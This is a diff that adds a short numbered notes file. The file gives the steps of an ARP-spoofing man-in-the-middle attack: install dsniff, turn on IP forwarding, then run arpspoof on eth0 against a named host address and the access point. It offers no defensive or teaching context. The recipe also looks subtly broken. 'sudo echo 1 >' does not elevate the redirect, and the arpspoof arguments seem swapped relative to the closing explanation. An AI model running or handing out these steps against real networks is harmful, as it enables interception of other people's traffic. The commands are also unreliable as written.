@@ -1,0 +1,14 @@
+
+1º
+
+#apt-get install dsniff
+
+2º
+
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+3º
+
+sudo arpspoof -i eth0 10.180.43.209 -t 10.180.40.1
+
+-> Where 10.180.43.209 is the host purposed and 10.180.40.1 is the acess point.
